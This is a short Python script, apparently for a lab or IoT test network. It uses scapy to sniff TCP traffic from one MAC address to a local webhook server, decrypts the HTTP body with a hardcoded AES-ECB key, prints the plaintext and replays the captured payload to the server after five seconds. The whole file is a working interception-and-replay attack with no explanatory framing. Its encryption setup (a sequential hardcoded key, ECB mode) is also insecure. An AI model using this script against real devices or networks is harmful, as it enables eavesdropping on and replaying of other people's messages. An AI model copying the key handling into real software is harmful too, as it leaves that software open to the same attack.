from scapy.all import sniff, Ether, IP, TCP, Raw
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64
import socket
import time
from time import sleep

target_mac = "08:a6:f7:46:dc:98"
target_ip = "192.168.1.7"
target_port = 5000
server_path = "/webhook"

key = bytes([
    0x00, 0x01, 0x02, 0x03,
    0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B,
    0x0C, 0x0D, 0x0E, 0x0F
])

def decrypt_aes(ciphertext):
    encrypted_bytes = base64.b64decode(ciphertext)
    cipher = AES.new(key, AES.MODE_ECB)
    decrypted = cipher.decrypt(encrypted_bytes)
    return unpad(decrypted, AES.block_size)

def packet_filter(pkt):
    return (
        pkt.haslayer(Ether) and pkt.haslayer(IP) and pkt.haslayer(TCP)
        and pkt[Ether].src.lower() == target_mac
        and pkt[IP].dst == target_ip
        and pkt[TCP].dport == target_port
        and pkt.haslayer(Raw)
    )

def send_http_post(ip, port, path, body):
    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {ip}\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            s.sendall(request)
            response = b""
            while True:
                part = s.recv(4096)
                if not part:
                    break
                response += part
            print("Server response:")
            print(response.decode(errors='ignore'))
    except Exception as e:
        print(f"Socket error: {e}")

def packet_handler(pkt):
    raw_payload = bytes(pkt[Raw].load)

    try:
        raw_str = raw_payload.decode(errors='ignore')
        parts = raw_str.split("\r\n\r\n", 1)
        if len(parts) == 2:
            encrypted = parts[1].encode()
        else:
            encrypted = raw_payload

        decrypted = decrypt_aes(encrypted)
        print(f"Decrypted: {decrypted.decode(errors='ignore')}")
    except Exception as e:
        print(f"Decryption failed: {e}")

    print("Captured packet. Sending HTTP POST to server...")
    sleep(5)  # Wait for 5 seconds before sending
    send_http_post(target_ip, target_port, server_path, raw_payload)

print("Sniffing one packet...")
sniff(prn=packet_handler, lfilter=packet_filter, store=False, count=2)
